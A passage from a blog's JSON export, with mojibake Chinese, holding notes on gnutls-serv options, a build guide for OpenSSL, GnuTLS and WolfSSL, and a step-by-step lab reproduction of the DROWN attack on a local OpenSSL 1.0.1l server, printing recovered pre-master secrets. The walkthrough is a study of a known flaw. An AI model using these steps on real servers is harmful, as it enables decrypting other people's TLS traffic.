16:23:57 [TOC] å‘½ä»¤è¡Œè§£æ gnutls-serv https://gnutls.org/manual/html_node/gnutls_002dserv-Invocation.html GnuTLS server gnutls-serv - GnuTLS server Usage: gnutls-serv [ -&lt;flag> [&lt;val>] | --&lt;name>[&#123;=| &#125;&lt;val>] ]... -d, --debug=num Enable debugging - it must be in the range: 0 to 9999 --sni-hostname=str Server's hostname for server name extension --sni-hostname-fatal Send fatal alert on sni-hostname mismatch --alpn=str Specify ALPN protocol to be enabled by the server - may appear multiple times --alpn-fatal Send fatal alert on non-matching ALPN name --noticket Don't accept session tickets --earlydata Accept early data --maxearlydata=num The maximum early data size to accept - it must be in the range: greater than or equal to 1 --nocookie Don't require cookie on DTLS sessions -g, --generate Generate Diffie-Hellman parameters -q, --quiet Suppress some messages --nodb Do not use a resumption database --http Act as an HTTP server --echo Act as an Echo server --crlf Do not replace CRLF by LF in Echo server mode -u, --udp Use DTLS (datagram TLS) over UDP --mtu=num Set MTU for datagram TLS - it must be in the range: 0 to 17000 --srtp-profiles=str Offer SRTP profiles -a, --disable-client-cert Do not request a client certificate - prohibits the option 'require-client-cert' -r, --require-client-cert Require a client certificate --verify-client-cert If a client certificate is sent then verify it. -b, --heartbeat Activate heartbeat support --x509fmtder Use DER format for certificates to read from --priority=str Priorities string --dhparams=file DH params file to use - file must pre-exist --x509cafile=str Certificate file or PKCS #11 URL to use --x509crlfile=file CRL file to use - file must pre-exist --x509keyfile=str X.509 key file or PKCS #11 URL to use - may appear multiple times --x509certfile=str X.509 Certificate file or PKCS #11 URL to use - may appear multiple times --rawpkkeyfile=str Private key file (PKCS #8 or PKCS #12) or PKCS #11 URL to use - may appear multiple times --rawpkfile=str Raw public-key file to use - requires the option 'rawpkkeyfile' - may appear multiple times --srppasswd=file SRP password file to use - file must pre-exist --srppasswdconf=file SRP password configuration file to use - file must pre-exist --pskpasswd=file PSK password file to use - file must pre-exist --pskhint=str PSK identity hint to use --ocsp-response=str The OCSP response to send to client - may appear multiple times --ignore-ocsp-response-errors Ignore any errors when setting the OCSP response -p, --port=num The port to connect to -l, --list Print a list of the supported algorithms and modes --provider=file Specify the PKCS #11 provider library - file must pre-exist --keymatexport=str Label used for exporting keying material --keymatexportsize=num Size of the exported keying material --recordsize=num The maximum record size to advertise - it must be in the range: 0 to 16384 --httpdata=file The data used as HTTP response - file must pre-exist -v, --version[=arg] output version information and exit -h, --help display extended usage information and exit -!, --more-help extended usage information passed thru pager Options are specified by doubled hyphens and their name or by a single hyphen and the flag character. Server program that listens to incoming TLS connections. ä½¿ç”¨ æœåŠ¡ç«¯ Note that the server listens to port 5556 by default. ä¾‹å­ gnutls-serv --http --x509keyfile experiments/keystore/rsa2048_key.pem --x509certfile experiments/keystore/rsa2048_cert.pem --x509cafile experiments/keystore/rsa2048_cert.pem --pskpasswd experiments/keystore/keys.psk --priority NORMAL:+PSK:+SRP --mtu 1500 -p 30002\"","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"GnuTLS","slug":"GnuTLS","permalink":"https://www.sizaif.com/tags/GnuTLS/"}],"author":"sizaif"},{"title":"Fuckopenssl 1.0.1l","slug":"fuckopenssl-1-0-1l","date":"2021-08-10T06:19:18.000Z","updated":"2021-08-14T14:15:24.739Z","comments":true,"path":"posts/2dc41376/","link":"","permalink":"https://www.sizaif.com/posts/2dc41376/","excerpt":"","text":"fuckopenssl 1.0.1l [TOC] 2021-08-10 14:19:38 @Auther by : sizaif å®‰è£… openssl 1.0.1l ä¸æ•´å¹ºè›¾å­, å°±é»˜è®¤å®‰è£…ä½ç½® code wget https://www.openssl.org/source/openssl-1.0.1l.tar.gz tar xzf openssl-1.0.1l.tar.gz cd openssl-1.0.1l ./config enable-ssl2 enable-weak-ciphers make &amp;&amp; make install # é»˜è®¤å®‰è£…ä½ç½®åœ¨ /usr/local/ssl æ›´æ”¹ç‰ˆæœ¬ä¿¡æ¯ code # å°†æ—§ç‰ˆæœ¬çš„opensslè¿›è¡Œå¤‡ä»½ # å¦‚æœå·²ç»æ˜¯root äº† å°±ä¸ç”¨sudo sudo mv /usr/bin/openssl /usr/bin/openssl.old # å°†æ–°ç‰ˆæœ¬çš„opensslè¿›è¡Œè½¯é“¾æ¥ sudo ln -s /usr/local/ssl/bin/openssl /usr/bin/openssl #è¿›å…¥etcç›®å½• cd /etc/ #ä¸‹ä¸€æ­¥ä¸€å®šè¦åˆ‡æ¢åˆ°rootç”¨æˆ· # å¦‚æœå·²ç»æ˜¯root ç”¨æˆ·, ç›´æ¥æ‰§è¡Œ echo \"/usr/local/lib\" >> ld.so.conf su #å°†opensslçš„å®‰è£…è·¯å¾„åŠ å…¥é…ç½®ä¸­ echo \"/usr/local/lib\" >> ld.so.conf # é‡æ–°åŠ è½½é…ç½® ldconfig ç»“æœå¦‚å›¾: å›¾ç‰‡ ç¼–è¯‘drown git clone https://github.com/Tim---/drown SSL_PREFIX=/usr/local/ssl make ç»“æœå¦‚å›¾: å›¾ç‰‡ ./decrypt host:port certfile c # ./decrypt 127.0.0.1:7899 certfile c # Passive attack Passive attack # å› ä¸ºå·²ç»å°† openssl1.0.1l é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ, æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨openssl å‘½ä»¤ # openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days # ç»“æœå¦‚ä¸‹: ######################################################################################### root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 123 Generating a 2048 bit RSA private key ...........................+++ ....+++ writing new private key to 'key.pem' Enter PEM pass phrase: # è¿™é‡Œè¾“å…¥çš„æ˜¯fuckopenssl Verifying - Enter PEM pass phrase: ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]:zh State or Province Name (full name) [Some-State]:beijing Locality Name (eg, city) []:beijing Organization Name (eg, company) [Internet Widgits Pty Ltd]:IBM Organizational Unit Name (eg, section) []:123 Common Name (e.g. server FQDN or YOUR name) []:root Email Address []:123456@123.com ######################################################################################### openssl s_server -cert cert.pem -key key.pem -accept 4433 -www # ######################################################################################### root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck# openssl s_server -cert cert.pem -key key.pem -accept 4433 -www Enter pass phrase for key.pem: # è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸Šé¢çš„fuckopenssl Using default temp DH parameters Using default temp ECDH parameters ACCEPT ######################################################################################### # æ‰“å¼€æ–°çª—å£ # å®‰è£… tshark apt-get install tshark # tshark -i lo -w handshakes.cap tcp port 4433 code # æ‰“å¼€æ–°çª—å£ # openssl å·²ç»é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ, æ‰€ä»¥ç›´æ¥ä½¿ç”¨openssl å‘½ä»¤ for i in $(seq 1000) ; do (echo 'GET / HTTP/1.1\\r\\n'; sleep 0.1) | openssl s_client -connect 127.0.0.1:4433 -cipher kRSA; done # å±•ç¤º ######################################################################################### New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384 SSL-Session: Protocol : TLSv1.2 Cipher : AES256-GCM-SHA384 Session-ID: 49EB9A81AD65AE80476F9F72CF4472D17CFB4E33539DAAE5734B5BD2EFD878F3 Session-ID-ctx: 01000000 Master-Key: CCCF32EBBEC91A411D63589FBFAD0B2CE8290797D2749BAF3FFD5C05A4CAB79CFE2E0DAC2939155721DF65218B9757EE Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None Start Time: 1620033794 Timeout : 300 (sec) Verify return code: 0 (ok) --- 128 items in the session cache 0 client connects (SSL_connect()) 0 client renegotiates (SSL_connect()) 0 client connects that finished 1000 server accepts (SSL_accept()) 0 server renegotiates (SSL_accept()) 1000 server accepts that finished 0 session cache hits 0 session cache misses 0 session cache timeouts 0 callback cache hits 872 cache full overflows (128 allowed) --- no client certificate available &lt;/BODY>&lt;/HTML> read:errno=0 ######################################################################################### # get the encrypted pre-master secrets for each session with tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d : ç»“æœå¦‚ä¸‹: å›¾ç‰‡ code # To decrypt these handshakes, we need an OpenSSL server accepting SSLv2 connections : openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2 ######################################################################################### root@iZj6cg4e6vhdv5s3hpkoffZ:~/supengfei/drown/fuck# openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2 Enter pass phrase for key.pem: # è¿™é‡Œè¾“å…¥çš„æ˜¯ ä¸Šé¢çš„pem: fuckfuckfuck Using default temp DH parameters Using default temp ECDH parameters ACCEPT ######################################################################################### # We can now decrypt the encrypted pre-master secret #åœ¨drown/fuck/ç›®å½•ä¸‹æ‰§è¡Œ ######################################################################################### # root@iZj6cg4e6vhdv5s3hpkoffZ:~# ll supengfei/drown/fuck/ # total 8024 # drwxr-xr-x 2 root root 4096 May 3 17:33 ./ # drwxr-xr-x 4 root root 4096 May 3 17:28 ../ # -rw-r--r-- 1 root root 1375 May 3 17:14 cert.pem # -rw------- 1 root root 8196592 May 3 17:23 handshakes.cap # -rw-r--r-- 1 root root 1834 May 3 17:14 key.pem # -rw-r--r-- 1 root root 0 May 3 17:33 pms.tx # -rw-r--r-- 1 root root 0 May 3 17:28 pms.txt # root@iZj6cg4e6vhdv5s3hpkoffZ:~# ######################################################################################### #è¿™ä¸ªä½ç½®æ˜¯cert.perm handshakes.cap çš„ä½ç½® # ../decrypt æ˜¯drownç›®å½•ä¸‹ç¼–è¯‘åä¼šç”Ÿæˆä¸€ä¸ªdecryptå¯æ‰§è¡Œæ–‡ä»¶ä½ç½® tshark -r handshakes.cap -d tcp.port==4433,ssl -T fields -e ssl.handshake.epms -Y ssl.handshake.epms | tr -d : | ../decrypt localhost:4434 cert.pem > pms.txt ç»“æœå±•ç¤º å›¾ç‰‡ code RSA 830cdf70dc488c8b 0303b45e46017e9dfefd22a26b7c64648fb2d00fcf8627cb0070132e370ab57a1b595e2544b1668caf3618942c2a0e34 RSA a62c4d1a5c4322e2 0303e37a220b3300e6c0d139d55a1c44c2429f11b0613d746db390beb16ad8bb0203f7494d3e7385a294e4f8a18fa5ae RSA 7215d21d1c22dfb8 0303434023187d88c73a921af635d7861ed60d66ebc4053e487ea85ab6d6b76dd373844063e8da156505dc8466310395 RSA 1976fb27fbccbd36 0303c9c320f9cc92567bc488c502ffacbbef28241348e30df4b2d55fdd7f8680fb201b5f75e02b9bd1db4e8e2c2fdf84 RSA 3b56f9c80a754f77 0303e8abf59f4132b1634f2b4e04bf4362c7f6dae5077dc9b6bb0c48efe0c7be47a256267688c7e28e70a28c830e6af6 RSA 1686f037050931a5 03036cb5a1851a174a9f43f97be770bd22411da688197bef08154d7f91f687dc6e0090d35ce147862e8bcc5c7218398c RSA 6ce5d3fd06970d25 0303e4da20c0d6dd5e03bf97d0ee4d802cab150810df524359ab990df0a01f2d51fe6c69ebfdae99ff1b1c9042367966 RSA 0e447f6c36cadd1c 030313b76ce57518d001229385f6b3ca376821692f72401a32e8b2b9a1322f523b9dc3c4808e7975e6e96c3883c3b8c4 RSA 830280803c06b66a 0303c80069cbb7517d723d8476ff22077e7b33b10c67872093bc7793e01a501d56c2ea2f9d16266b32bd933d8d957f2b RSA 4ee250f545d2f1ae 0303096a212344c48bfaa3153f1d1196c81beb918d61e9497033b9bd4fb118dc474187fb0965de2eff0448c072ee46e0 RSA 7b5fddbfbc5e2586 0303c7714d54a817514c086f8d4004547fb6191cbc5cd36ec7816b4ab81295278b5ba13054014413cd3abf75faa05d60 RSA 6053a37a45c64592 03035126dad66420ee530e50be0cfdb6aca5cb3e6897c3a2c1cb56c39704112efd36069e450814ccd70b629dc23e26b4 RSA a04a28e475029688 03036657caed02639f6b450a0c7293f4abf3ad188652bd443f2d27e6ffe53f859d1d91441aa0fcc646648557ecb910f8 RSA 1d37821396fecd87 030375a2214a9b475fe93ddd424a71536a0642a07d0d093abdcc84a0e1b89d3f052719e44d1816f2698d24b67ef7cc26 RSA 62a5f513fc94585b 0303a873790bf018f5d6c4e1ac4d87487a34e58471762a2dffd6d92e122ec284b7dc2206569118e0a6ebfb4c2960457d RSA 8de0c774b04a20d2 0303e8748fbea20c72709a8dc436fc631521cbd068c6beddfacd4fb224ef03da92e76af9bbf3b740908efd699a797973 RSA a7575ef2b95aeeeb 03033f49c4e3b9642fddcda12c05601d69113adf7bebc4c0cb963ff898373a50a0494564c97a9e0ac3e18e1f709b68a9","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"}],"author":"sizaif"},{"title":"å®‰è£…Openssl GNUTLS WolfSSL æ‰‹å†Œ","slug":"å®‰è£…Openssl-GNUTLS-WolfSSL-æ‰‹å†Œ","date":"2021-08-10T06:11:40.000Z","updated":"2021-08-14T14:15:24.747Z","comments":true,"path":"posts/b924c044/","link":"","permalink":"https://www.sizaif.com/posts/b924c044/","excerpt":"","text":"å®‰è£…Openssl GNUTLS WolfSSL æ‰‹å†Œ ğŸ˜„ @Auther sizaif ğŸ“†2021-05-18 09:19:35 [TOC] OpenSSL é¡¹ç›®åœ°å€:https://www.openssl.org/ å®‰è£…ä¾èµ–åº“ # å®‰è£…ssl ä¾èµ–åº“ sudo apt update sudo apt-get install libssl-dev make ä¸‹è½½æºç å¹¶è¿›å…¥æ–‡ä»¶ https://www.openssl.org/source/old/1.1.1/ # ä¸‹è½½OpenSSLå¯¹åº”ç‰ˆæœ¬æºç  https://www.openssl.org/source/old/1.1.1/openssl-1.1.1j.tar.gz # è¿›å…¥æ–‡ä»¶å cd openssl-XXX/ ç¼–è¯‘å®‰è£… ç¼–è¯‘å®‰è£…æœ‰ä¸¤ç§æ–¹å¼, ä¸€ç§æ˜¯ç¼–è¯‘å,ä¸è¿›è¡Œå®‰è£…,å³ä¸æŠŠç¼–è¯‘åçš„æ–‡ä»¶å®‰è£…åˆ°ç³»ç»Ÿç¯å¢ƒä¸‹, è¾“å…¥openssl versionç‰ˆæœ¬ä¸å˜ å¦ä¸€ç§æ˜¯ç¼–è¯‘åè¿›è¡Œå®‰è£…,æ›´æ¢åˆ°ç³»ç»Ÿç¯å¢ƒä¸‹ ç¬¬ä¸€ç§,ä»…ç¼–è¯‘, ä½¿ç”¨æ—¶é€šè¿‡/openssl-xxx/apps/openssl ä½¿ç”¨è¿™ä¸ªç‰ˆæœ¬çš„openssl è¿™æ ·çš„ä¼˜åŠ¿æ˜¯,å¯ä»¥å¿«é€Ÿæµ‹è¯•å¤šä¸ªopensslçš„ç‰ˆæœ¬,è€Œä¸ç”¨é‡å¤æ›´æ–°å®‰è£… code # é…ç½®ç¯å¢ƒ prefix æ˜¯å®‰è£…ç›®å½•ï¼Œopenssldiræ˜¯é…ç½®æ–‡ä»¶ç›®å½• # # Configure --prefix=/YOUR PATH ./Configure # or ./config # ./config --prefix=/YOUR PATH # ç¼–è¯‘å®‰è£… #å› ä¸ºè¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å®‰è£…,åªéœ€è¦æ‹¿åˆ°ç¼–è¯‘çš„ç»“æœå»è¿è¡Œ # æ‰€ä»¥ ä¸éœ€è¦make install make ç¬¬äºŒç§,ç¼–è¯‘å®‰è£…, ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨openssl å‘½ä»¤æ¥ä½¿ç”¨æ–°å®‰è£…çš„ç‰ˆæœ¬ code # ç¼–è¯‘ éœ€è¦ç­‰å¥½é•¿æ—¶é—´, ä¸å¦‚è¶è¿™ä¸ªåŠŸå¤«å–å–ä¸ªèŒ¶,ä¸Šä¸ªæ´—æ‰‹é—´ make # ç¼–è¯‘å®Œæˆå, è¿›è¡Œå®‰è£… , ç­‰å¾…æ—¶é—´ä¹Ÿä¸çŸ­, ä¸å¦‚å»åˆ·ä¸ªå°è§†é¢‘ # make install # å°†æ—§ç‰ˆæœ¬çš„opensslè¿›è¡Œå¤‡ä»½ sudo mv /usr/bin/openssl /usr/bin/openssl.old # å°†æ–°ç‰ˆæœ¬çš„opensslè¿›è¡Œè½¯é“¾æ¥ sudo ln -s /usr/local/bin/openssl /usr/bin/openssl #è¿›å…¥etcç›®å½• cd /etc/ #ä¸‹ä¸€æ­¥ä¸€å®šè¦åˆ‡æ¢åˆ°rootç”¨æˆ· su #å°†opensslçš„å®‰è£…è·¯å¾„åŠ å…¥é…ç½®ä¸­ echo \"/usr/local/lib\" >> ld.so.conf # é‡æ–°åŠ è½½é…ç½® ldconfig # æµ‹è¯• ç‰ˆæœ¬ å¾—åˆ°å¦‚ä¸‹ç»“æœ openssl version >OpenSSL 1.1.1b 26 Feb 2019 # æµ‹è¯• ll /usr/local/include/ ll /usr/local/lib/ # å¦‚ä¸‹ç»“æœ #å¦‚æœéœ€è¦æ›´æ¢ç‰ˆæœ¬çš„è¯,ä¿®æ”¹è½¯é“¾æ¥çš„åç§°å³å¯ï¼Œå‚ç…§ï¼š #å°†æ—§ç‰ˆæœ¬è¿›è¡Œå¤‡ä»½ sudo mv /usr/include/openssl /usr/include/openssl.old #å°†æ–°ç‰ˆæœ¬è¿›è¡Œè½¯é“¾æ¥ sudo ln -s /usr/local/include/openssl /usr/include/openssl GnuTLS é¡¹ç›®åœ°å€: https://www.gnutls.org/index.html å®‰è£…ä¾èµ–åº“ ç¼–è¯‘éœ€è¦ libnettle å’Œgmplib Debian/Ubuntu: Debian/Ubuntu apt-get install -y dash git-core autoconf libtool gettext autopoint apt-get install -y automake autogen nettle-dev libp11-kit-dev libtspi-dev libunistring-dev apt-get install -y guile-2.0-dev libtasn1-6-dev libidn2-0-dev gawk gperf apt-get install -y libunbound-dev dns-root-data bison help2man gtk-doc-tools apt-get install -y texinfo texlive texlive-generic-recommended texlive-extra-utils apt-get install pkg-config ç¼–è¯‘å®‰è£… è§£é‡Šå¦‚ä¸‹ The GnuTLS Guile bindings are available for the Guile 3.0 and 2.2 series, as well as the legacy 2.0 and even 1.8 series. By default they are installed under the GnuTLS installation directory, typically /usr/local/share/guile/site/). Normally Guile will not find the module there without help. You may experience something like this: >$ guile >â€¦ >scheme@(guile-user)> (use-modules (gnutls)) >ERROR: no code for module (gnutls) There are two ways to solve this. The first is to make sure that when building GnuTLS, the Guile bindings will be installed in the same place where Guile looks. You may do this by using the --with-guile-site-dir parameter as follows: >$ ./configure --with-guile-site-dir=no å‘½ä»¤å¦‚ä¸‹ # --with-guile-site-dir=no æ„å»ºGnuTLSæ—¶ï¼ŒGuileç»‘å®šå°†å®‰è£…åœ¨ä¸Guileç›¸åŒçš„ä½ç½®, è§£é‡Šå¦‚ä¸Š # å› ä¸ºåªéœ€è¦æµ‹è¯•GnuTls æ‰€ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ # è§†å®é™…æƒ…å†µå†³å®š ./configure --with-guile-site-dir=no --with-included-libtasn1 --with-included-unistring --without-p11-kit --disable-guile --disable-doc ./configureç»“æœ ./configureç»“æœ configure: summary of build options: version: 3.6.7 shared 53:2:23 Host/Target system: x86_64-pc-linux-gnu Build system: x86_64-pc-linux-gnu Install prefix: /usr/local Compiler: gcc Valgrind: no CFlags: -g -O2 Library types: Shared=yes, Static=no Local libopts: yes Local libtasn1: yes Local unistring: yes Use nettle-mini: no Documentation: no (manpages: no) configure: External hardware support: /dev/crypto: no Hardware accel: x86-64 Padlock accel: yes Random gen. variant: getrandom PKCS#11 support: no TPM support: no configure: Optional features: (note that included applications might not compile properly if features are disabled) SSL3.0 support: no SSL2.0 client hello: yes Allow SHA1 sign: no DTLS-SRTP support: yes ALPN support: yes OCSP support: yes SRP support: yes PSK support: yes DHE support: yes ECDHE support: yes GOST support: yes Anon auth support: yes Heartbeat support: yes IDNA support: no Non-SuiteB curves: no FIPS140 mode: no configure: Optional libraries: Guile wrappers: no C++ library: yes DANE library: no OpenSSL compat: no configure: System files: Trust store pkcs11: Trust store dir: Trust store file: /etc/ssl/certs/ca-certificates.crt Blacklist file: CRL file: Priority file: /etc/gnutls/default-priorities DNSSEC root key file: /etc/unbound/root.key configure: WARNING: *** *** The DNSSEC root key file in /etc/unbound/root.key was not found. *** This file is needed for the verification of DNSSEC responses. *** Use the command: unbound-anchor -a \"/etc/unbound/root.key\" *** to generate or update it. *** å®‰è£… åŒOpenssl ä¸€æ ·, æœ‰ä¸¤ç§æ–¹å¼, ä»… make å’Œ make &amp;&amp; make install code # ç¼–è¯‘ make # ç¼–è¯‘å åœ¨ src ç›®å½•ä¸‹ å¯ä»¥å¾—åˆ° gnutls-cli gnutls-cli-debug gnutls-serv å¯æ‰§è¡Œæ–‡ä»¶ # éªŒè¯ç‰ˆæœ¬ $root@380xxx:/xxx/gnutls-3.6.7# ./src/gnutls-serv -v gnutls-serv 3.6.7 Copyright (C) 2000-2019 Free Software Foundation, and others, all rights reserved. This is free software. It is licensed for use, modification and redistribution under the terms of the GNU General Public License, version 3 or later &lt;http://gnu.org/licenses/gpl.html> Please send bug reports to: &lt;bugs@gnutls.org> ######################################################################################## # å¦‚æœ å®‰è£…çš„è¯ æ‰§è¡Œ make install make install # ä¼šåœ¨ /usr/local/include/gnutls ç”Ÿæˆå¤´æ–‡ä»¶ # /usr/local/bin/ ä¸‹ ç”Ÿæˆ gnutls-cli gnutls-cli-debug gnutls-serv å¯æ‰§è¡Œæ–‡ä»¶ # éªŒè¯ç‰ˆæœ¬ $root@380xxx:/xxx/gnutls-3.6.7# /usr/local/bin/gnutls-serv -v gnutls-serv 3.6.7 Copyright (C) 2000-2019 Free Software Foundation, and others, all rights reserved. This is free software. It is licensed for use, modification and redistribution under the terms of the GNU General Public License, version 3 or later &lt;http://gnu.org/licenses/gpl.html> Please send bug reports to: &lt;bugs@gnutls.org> WolfSSL https://github.com/wolfSSL/wolfssl https://www.wolfssl.com/ ä¸‹è½½æºç  https://www.wolfssl.com/download/# æ‰‹åŠ¨ä¸‹è½½ ç¼–è¯‘å®‰è£… ./configure#./configure --help ./configure --enable-psk --enable-pwdbased --enable-rsa --enable-sha --enable-debug --disable-dh --disable-ecc C_EXTRA_FLAGS=-DWOLFSSL_STATIC_PSK ç»“æœ code Configuration summary for wolfssl version 4.7.0 * Installation prefix: /usr/local * System type: pc-linux-gnu * Host CPU: x86_64 * C Compiler: gcc * C Flags: -DWOLFSSL_STATIC_PSK -g -ggdb -O0 -Wno-pragmas -Wall -Wno-strict-aliasing -Wextra -Wu nknown-pragmas --param=ssp-buffer-size=1 -Waddress -Warray-bounds -Wbad-function-cast -Wchar-subscripts -Wcomment -Wfloa t-equal -Wformat-security -Wformat=2 -Wmaybe-uninitialized -Wmissing-field-initializers -Wmissing-noreturn -Wmissing-pro totypes -Wnested-externs -Wnormalized=id -Woverride-init -Wpointer-arith -Wpointer-sign -Wredundant-decls -Wshadow -Wsig n-compare -Wstrict-overflow=1 -Wswitch-enum -Wundef -Wunused -Wunused-result -Wunused-variable -Wwrite-strings -fwrapv * C++ Compiler: * C++ Flags: * CPP Flags: * CCAS Flags: -DWOLFSSL_STATIC_PSK * LIB Flags: -pie -z relro -z now * Debug enabled: yes * Coverage enabled: * Warnings as failure: no * make -j: 9 * VCS checkout: no Features * FIPS: no * Single threaded: no * Filesystem: yes * OpenSSH Build: no * OpenSSL Extra API: no * OpenSSL Coexist: no * Old Names: yes * Max Strength Build: no * Distro Build: no * Reproducible Build: no * fastmath: yes * Assembly Allowed: yes * sniffer: no * snifftest: no * ARC4: no * AES: yes * AES-NI: no * AES-CBC: yes * AES-GCM: yes * AES-CCM: no * AES-CTR: no * AES-CFB: no * AES-OFB: no * DES3: no * IDEA: no * Camellia: no * NULL Cipher: no * MD2: no * MD4: no * MD5: yes * RIPEMD: no * SHA: yes * SHA-224: yes * SHA-384: yes * SHA-512: yes * SHA3: yes * SHAKE256: yes * BLAKE2: no * BLAKE2S: no * CMAC: no * keygen: no * certgen: no * certreq: no * certext: no * certgencache: no * HC-128: no * RABBIT: no * CHACHA: yes * XCHACHA: no * Hash DRBG: yes * PWDBASED: yes * scrypt: no * wolfCrypt Only: no * HKDF: yes * X9.63 KDF: no * MD4: no * PSK: yes * Poly1305: yes * LEANPSK: no * LEANTLS: no * RSA: yes * RSA-PSS: yes * DSA: no * DH: no * DH Default Parameters: yes * ECC: no * ECC Custom Curves no * ECC Minimum Bits 224 * CURVE25519: no * ED25519: no * CURVE448: no * ED448: no * FPECC: no * ECC_ENCRYPT: no * ASN: yes * Anonymous cipher: no * CODING: yes * MEMORY: yes * I/O POOL: no * LIGHTY: no * HAPROXY: no * STUNNEL: no * Apache httpd: no * NGINX: no * ASIO: no * LIBWEBSOCKETS: no * Qt no * Qt Unit Testing no * SIGNAL: no * ERROR_STRINGS: yes * DTLS: no * SCTP: no * Indefinite Length: no * Multicast: no * SSL v3.0 (Old): no * TLS v1.0 (Old): no * TLS v1.1 (Old): yes * TLS v1.2: yes * TLS v1.3: yes * Post-handshake Auth: no * Early Data: no * Send State in HRR Cookie: no * OCSP: no * OCSP Stapling: no * OCSP Stapling v2: no * CRL: no * CRL-MONITOR: no * Persistent session cache: no * Persistent cert cache: no * Atomic User Record Layer: no * Public Key Callbacks: no * NTRU: no * QSH: no * Whitewood netRandom: no * Server Name Indication: no * ALPN: no * Maximum Fragment Length: no * Trusted CA Indication: no * Truncated HMAC: no * Supported Elliptic Curves: no * FFDHE only in client: no * Session Ticket: no * Extended Master Secret: yes * Renegotiation Indication: no * Secure Renegotiation: no * Fallback SCSV: no * Keying Material Exporter: no * All TLS Extensions: no * PKCS#7 no * S/MIME no * wolfSSH no * wolfTPM no * wolfSCEP no * Secure Remote Password no * Small Stack: no * Linux Kernel Module: no * valgrind unit tests: no * LIBZ: no * Examples: yes * Crypt tests: yes * Stack sizes in tests: no * Heap stats in tests: no * User Crypto: no * Fast RSA: no * Single Precision: no * SP math implementation: no * Async Crypto: no * PKCS#11: no * PKCS#12: yes * Cavium Nitrox: no * Cavium Octeon (Sync): no * Intel Quick Assist: no * ARM ASM: no * AES Key Wrap: no * Write duplicate: no * Xilinx Hardware Acc.: no * Inline Code: yes * Linux AF_ALG: no * Linux devcrypto: no * Crypto callbacks: no code make # å¦‚æœé‡åˆ°é”™è¯¯ 'aclocal-1.15' is missing on your systemâ€ # å…ˆæ‰§è¡Œautoreconf -f -i åœ¨æ‰§è¡Œ ./configure åœ¨ make ## å®‰è£… å¦‚ä¸Š sudo make install # To test the build, run the testsuite program from the root wolfSSL directory: ./testsuite/testsuite.test # or use autoconf to run the testsuite as well as the standard wolfSSL API and crypto tests: make test ############################ # å¦‚æœæ²¡æœ‰configure ä½¿ç”¨ cmake # å®‰è£… cmake sudo apt-get install cmake # Usage: mkdir build &amp;&amp; cd build cmake .. cmake --build . ç»“æœè¿è¡Œ åœ¨æ ¹ç›®å½•ä¸‹/exaples/ ä¸­ æœ‰ server å’Œ client","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"}],"tags":[{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"GnuTLS","slug":"GnuTLS","permalink":"https://www.sizaif.com/tags/GnuTLS/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"